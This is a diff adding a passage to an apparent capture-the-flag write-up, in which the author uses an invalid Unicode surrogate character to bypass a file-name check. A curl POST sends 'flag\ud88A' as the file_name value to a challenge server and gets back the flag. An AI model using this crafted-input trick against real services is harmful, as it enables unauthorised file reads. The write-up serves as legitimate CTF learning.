@@ -96,6 +96,17 @@ make sure you work w/ python or you'll get lonely
 
 *From this phrase let's pick up some key words for reasearch*
 
+After some research I found a good article, which incate some invalid character to use https://charbase.com/d86e-unicode-invalid-character.
+
+I tried different value and I assume that the form could be exploited with "flag/ud88*", below an example:
+
+```
+curl -X POST "http://35.211.91.235:8000/" -H "Content-Type: application/json" -d '{ "file_name" : "flag\ud88A"}'
+```
+***Results***
+
+{"response":"SNYK{FLAG}"}
+
 
 
 
